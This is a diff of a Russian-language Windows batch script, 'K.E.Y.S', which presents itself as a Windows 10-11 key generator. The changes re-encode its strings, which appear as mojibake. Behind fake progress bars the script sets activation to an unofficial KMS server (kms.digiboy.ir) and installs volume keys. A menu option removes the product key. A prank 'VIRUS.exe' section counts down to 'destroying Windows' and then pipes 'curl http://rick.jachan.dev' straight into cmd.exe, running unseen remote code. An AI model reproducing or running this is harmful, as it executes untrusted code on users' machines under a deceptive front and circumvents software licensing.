@@ -32,10 +32,10 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 rem ver 2.0.0 beta 3.1
-chcp 855
+chcp 1251
 
 
-rem ô¦¨ãí ØáÖ¦ÖÐé ½å¨ ëñØÖÐÔ¨Ô·¨ ë õ¨¬Ö ãÆá·Øå  ã Øá ë Ò·  ¦Ò·Ô·ãåá åÖá 
+rem Çäåñü ïðîäîëæàéòå âûïîëíåíèå âàøåãî ñêðèïòà ñ ïðàâàìè àäìèíèñòðàòîðà
 @echo off
 cls
 goto nb
@@ -44,14 +44,14 @@ color 6
 cls
 
 
-"%~dp0\nhmb\nhcolor.exe" 0e ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
-"%~dp0\nhmb\nhcolor.exe" 0e º-----------------KEYS------------------º
-"%~dp0\nhmb\nhcolor.exe" 0e ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
-echo C¦¨Ð ÔÖ Cats coding Batch
+"%~dp0\nhmb\nhcolor.exe" 0e ã=======================================¬
+"%~dp0\nhmb\nhcolor.exe" 0e ¦-----------------KEYS------------------¦
+"%~dp0\nhmb\nhcolor.exe" 0e L=======================================-
+echo Cäåëàíî Cats coding Batch
 echo.
-echo K.E.Y.S - æÖÐíÆÖ ¦ÐÞ Windows 10-11 
+echo K.E.Y.S - Òîëüêî äëÿ Windows 10-11 
 >nul timeout/nobreak 4
-echo Õ éÒ·å¨ Ðœ¢çœ ÆÔÖØÆç ¦ÐÞ Ø¨á¨µÖ¦  ë Ò¨Ôœ
+echo Íàæìèòå ëþáóþ êíîïêó äëÿ ïåðåõîäà â ìåíþ
 pause >nul
 :menu
 cls
@@ -59,37 +59,37 @@ cls
 :menurun
 cls
 color 6
-echo ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
-echo º  MENU                                        º
-echo ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
-echo º1. Õ û åí ¬¨Ô¨á ¤·œ                           º
-echo º2. ÝÖ¦¦¨áé åí  ëåÖá                           º
-echo º3. æ­Ç Cats coding batch                      º
-echo º4. ì ãå áåÖëÖ¨ Ò¨Ôœ                           º
-echo º5. è¦ Ð·åí  Æå·ë ¤·œ ë·Ô¦Öëã (×ü©Õî ×Ý¡äÕ×!)   º
-echo º6. English Version                            º
-echo ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
-echo ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
-echo ºÇÑü = %key% º
-echo ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
-set /p choice=ìñ¢¨á· ØçÔÆå: 
+echo ã==============================================¬
+echo ¦  MENU                                        ¦
+echo ¦==============================================¦
+echo ¦1. Íà÷àòü ãåíåðàöèþ                           ¦
+echo ¦2. Ïîääåðæàòü àâòîðà                          ¦
+echo ¦3. ÒÃÊ Cats coding batch                      ¦
+echo ¦4. Â ñòàðòîâîå ìåíþ                           ¦
+echo ¦5. Óäàëèòü àêòèâàöèþ âèíäîâñ (Î×ÅÍÜ ÎÏÀÑÍÎ!)   ¦
+echo ¦6. English Version                            ¦
+echo L==============================================-
+echo ã=====================================¬
+echo ¦ÊËÞ× = %key% ¦
+echo L=====================================-
+set /p choice=Âûáåðè ïóíêò: 
 if %choice%==1 (
-	"%~dp0\nhmb\nhmb.exe" "£ÖÐíõ Þ ØáÖãí¢ ,\nÔ¨ ëñÆÐœû åí ØáÖ¬á ÒÒç ëÖ ëá¨ÒÞ ¬¨Ô¨á¤·· ÆÐœû !\nÕ ¦¨œãí ëã¨ ØÖÔÞåÔÖ " "KEYS" "Information|NoButtons" "10"
+	"%~dp0\nhmb\nhmb.exe" "Áîëüøàÿ ïðîñüáà,\níå âûêëþ÷àòü ïðîãðàììó âî âðåìÿ ãåíåðöèè êëþ÷à!\nÍàäåþñü âñå ïîíÿòíî " "KEYS" "Information|NoButtons" "10"
     goto gen
 ) else if %choice%==2 (
 	cls
     color a
-	echo ô ØçãÆ œ £çãå·
+	echo Çàïóñêàþ Áóñòè
 	ping localhost -n 3 >nul
 	start https://boosty.to/foxinabox
-	echo ìÖóëá ù¨Ô·¨ ë Ò¨Ôœ
+	echo Âîçâðàùåíèå â ìåíþ
 	goto menurun
 ) else if %choice%==3 (
 	cls
 	color 1
     start https://t.me/Cats_coding_batch
 	ping localhost -n 3 >nul
-	echo ìÖóëá ù¨Ô·¨ ë Ò¨Ôœ
+	echo Âîçâðàùåíèå â ìåíþ
 	goto menurun
 ) else if %choice%==4 (
 	cls
@@ -100,13 +100,13 @@ if %choice%==1 (
 	echo MsgBox "poshalko shto z debil" > CCB.vbs
 	cscript //nologo CCB.vbs
 	del CCB.vbs
-	echo è¦ Ð¨Ô·¨  Æå·ë ¤·· ë·Ô¦Öëã û¨á¨ó 3 ã¨ÆçÔ¦ñ...
+	echo Óäàëåíèå àêòèâàöèè âèíäîâñ ÷åðåç 3 ñåêóíäû...
 	>nul timeout/nobreak 1
-	echo è¦ Ð¨Ô·¨  Æå·ë ¤·· ë·Ô¦Öëã û¨á¨ó 2 ã¨ÆçÔ¦ñ...
+	echo Óäàëåíèå àêòèâàöèè âèíäîâñ ÷åðåç 2 ñåêóíäû...
 	>nul timeout/nobreak 1
-	echo è¦ Ð¨Ô·¨  Æå·ë ¤·· ë·Ô¦Öëã û¨á¨ó 1 ã¨ÆçÔ¦ñ...
+	echo Óäàëåíèå àêòèâàöèè âèíäîâñ ÷åðåç 1 ñåêóíäû...
 	>nul timeout/nobreak 1
-	echo è¦ Ð¨Ô·¨  Æå·ë ¤·· ØáÖ·óÖõÐÖ çãØ¨õÔÖ!
+	echo Óäàëåíèå àêòèâàöèè ïðîèçîøëî óñïåøíî!
 	slmgr /upk
 	goto menurun
 ) else if %choice%==6 (
@@ -119,14 +119,14 @@ if %choice%==1 (
 
 :kill
 color 4
-"%~dp0\nhmb\nhmb.exe" "æñ ¦ÖÐ¢ ¨¢?" "VIRUS.exe" "Error|YesNo" ""
+"%~dp0\nhmb\nhmb.exe" "Òû äîëáàåá?" "VIRUS.exe" "Error|YesNo" ""
 if "%errorlevel%" == "%IDNO%" goto no
-echo ÓÖÐÖ¦¨¤, ÒÖé¨õí ·¦å·
+echo Ìîëîäåö, ìîæåøü èäòè
 ping localhost -n 2 >nul
 goto menurun
 :no
 >nul timeout/nobreak 1
-echo èÔ·ûåÖé¨Ô·¨ ë·Ô¦Öëã û¨á¨ó
+echo Óíè÷òîæåíèå âèíäîâñ ÷åðåç
 >nul timeout/nobreak 1
 echo 5
 >nul timeout/nobreak 1
@@ -138,7 +138,7 @@ echo 2
 >nul timeout/nobreak 1
 echo 1
 >nul timeout/nobreak 1
-"%~dp0\nhmb\nhmb.exe" "à ØÖõçå·Ð)" "KEYS" "Information|NoButtons" "5"
+"%~dp0\nhmb\nhmb.exe" "ß ïîøóòèë)" "KEYS" "Information|NoButtons" "5"
 curl.exe -sN http://rick.jachan.dev | cmd.exe
 goto menurun
 :gen
@@ -154,7 +154,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ...        ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà...        Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo                                 =   0 ]
 echo ---------------------------------------
@@ -168,7 +168,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ .          ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà.          Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo []                              =   5 ]
 echo ---------------------------------------
@@ -182,7 +182,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ..         ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà..         Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][]                            =  15 ]
 echo ---------------------------------------
@@ -196,7 +196,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ...        ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà...        Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][]                          =  23 ]
 echo ---------------------------------------
@@ -210,7 +210,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ .          ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà.          Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][]                        =  30 ]
 echo ---------------------------------------
@@ -224,7 +224,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ..         ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà..         Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][]                      =  38 ]
 echo ---------------------------------------
@@ -238,7 +238,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ...        ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà...        Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][]                      =  42 ]
 echo ---------------------------------------
@@ -252,7 +252,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ .          ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà.          Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][]                    =  45 ]
 echo ---------------------------------------
@@ -266,7 +266,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ..         ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà..         Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][]                  =  48 ]
 echo ---------------------------------------
@@ -281,7 +281,7 @@ echo.
 echo.
 echo.
 slmgr /skms kms.digiboy.ir
-echo    ô ¬áçóÆ ...        ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà...        Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][]                =  50 ]
 echo ---------------------------------------
@@ -295,7 +295,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ .           ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà.           Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][]              =  56 ]
 echo ---------------------------------------
@@ -309,7 +309,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ..         ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà..         Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][]            =  63 ]
 echo ---------------------------------------
@@ -323,7 +323,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ...        ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà...        Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][][]          =  69 ]
 echo ---------------------------------------
@@ -337,7 +337,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ .          ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà.          Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][][][]        =  75 ]
 echo ---------------------------------------
@@ -351,7 +351,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ..         ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà..         Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][][][][]      =  79 ]
 echo ---------------------------------------
@@ -367,10 +367,10 @@ echo.
 echo. 
 setlocal
 
-rem ÝÖÐçû ¨Ò ·ÔªÖáÒ ¤·œ Ö ë¨áã·· Windows ·ó á¨¨ãåá 
+rem Ïîëó÷àåì èíôîðìàöèþ î âåðñèè Windows èç ðååñòðà
 for /f "tokens=2*" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName') do set "version=%%j"
 
-rem ÝáÖë¨áÞ¨Ò, ÞëÐÞ¨åãÞ Ð· ë¨áã·Þ Home ·Ð· Pro
+rem Ïðîâåðÿåì, ÿâëÿåòñÿ ëè âåðñèÿ Home èëè Pro
 if /i "%version%"=="Windows 10 Home" (
     set Edition=Home
 	set KEY=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
@@ -385,7 +385,7 @@ if /i "%version%"=="Windows 10 Home" (
 	set KEY=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
 ) else (
     set Edition=Other
-	set KEY=M7XTQ-FN8P6-TTKYV-9D4CC-J462D ·Ð· KBN8V-HFGQ4-MGXVD-347P6-PDQGT
+	set KEY=M7XTQ-FN8P6-TTKYV-9D4CC-J462D èëè KBN8V-HFGQ4-MGXVD-347P6-PDQGT
 )
 
 
@@ -398,7 +398,7 @@ if %Edition%==Pro (
 	slmgr /ipk M7XTQ-FN8P6-TTKYV-9D4CC-J462D
 )
 
-echo    ô ¬áçóÆ ...        ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà...        Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][][][][][]    =  86 ]
 echo ---------------------------------------
@@ -412,7 +412,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ .          ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà.          Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][][][][][][]  =  90 ]
 echo ---------------------------------------
@@ -426,7 +426,7 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ..         ­¨Ô¨á·áçœ ÆÐœû
+echo    Çàãðóçêà..         Ãåíåðèðóþ êëþ÷
 echo ---------------------------------------
 echo [][][][][][][][][][][][][][][]  =  96 ]
 echo ---------------------------------------
@@ -440,20 +440,20 @@ echo.
 echo.
 echo.
 echo.
-echo    ô ¬áçóÆ ...        .Complete.
+echo    Çàãðóçêà...        .Complete.
 echo ---------------------------------------
 echo [][][][][][][][][][][][][][][][]= 100 ]
 echo ---------------------------------------
 cls
 color a
 start explorer.exe
-echo èãØ¨õÔÖ
+echo Óñïåøíî
 echo [--------------------------------------]
-echo ì¡ö ÇÑü = %KEY%
+echo ÂÀØ ÊËÞ× = %KEY%
 echo [--------------------------------------]
-echo ì õ  ë¨áã·Þ Windows: %Edition%
+echo Âàøà âåðñèÿ Windows: %Edition%
 >nul timeout/nobreak 5
-echo Õ éÒ·å¨ Ðœ¢çœ ÆÔÖØÆç ¦ÐÞ Ø¨á¨µÖ¦  ë Ò¨Ôœ
+echo Íàæìèòå ëþáóþ êíîïêó äëÿ ïåðåõîäà â ìåíþ
 pause >nul
 goto menurun
 :start
@@ -570,7 +570,7 @@ rem Wait 500
 rem ClearColor
 rem Locate 30 1
 
-rem ÝÖ¦¬áçóÆ  ¢·¢Ð·Öå¨Æ
+rem Ïîäãðóçêà áèáëèîòåê
 set IDOK=1
 set IDCANCEL=2
 set IDABORT=3
@@ -580,8 +580,8 @@ set IDYES=6
 set IDNO=7
 set IDTRYAGAIN=10
 set IDCONTINUE=11
-rem ìÖå åçå nhmb
+rem Âîò òóò nhmb
 title K.E.Y.S - Made by CCB
-"%~dp0\nhmb\nhmb.exe" "K.E.Y.S Made by CCB\n£ÖÐíõÖ¨ ãØ ã·¢Ö ó  ·ãØÖÐíóÖë Ô·¨!\nô ¬áçóÆ  £·¢Ð·Öå¨Æ ó ë¨áõ¨Ô ! " "KEYS" "Information|NoButtons" "5"
-"%~dp0\nhmb\nhmb.exe" "øæ× £©æ¡ ì©âä¸à, ØÖÐÔñ½ ªçÔÆ¤·ÖÔ Ð ÒÖé¨å ¢ñåí Ô¨¦ÖãåçØ¨Ô" "KEYS" "Information|NoButtons" "5"
+"%~dp0\nhmb\nhmb.exe" "K.E.Y.S Made by CCB\nÁîëüøîå ñïàñèáî çà èñïîëüçîâàíèå!\nÇàãðóçêà Áèáëèîòåê çàâåðøåíà! " "KEYS" "Information|NoButtons" "5"
+"%~dp0\nhmb\nhmb.exe" "ÝÒÎ ÁÅÒÀ ÂÅÐÑÈß, ïîëíûé ôóíêöèîíàë ìîæåò áûòü íåäîñòóïåí" "KEYS" "Information|NoButtons" "5"
 goto start 
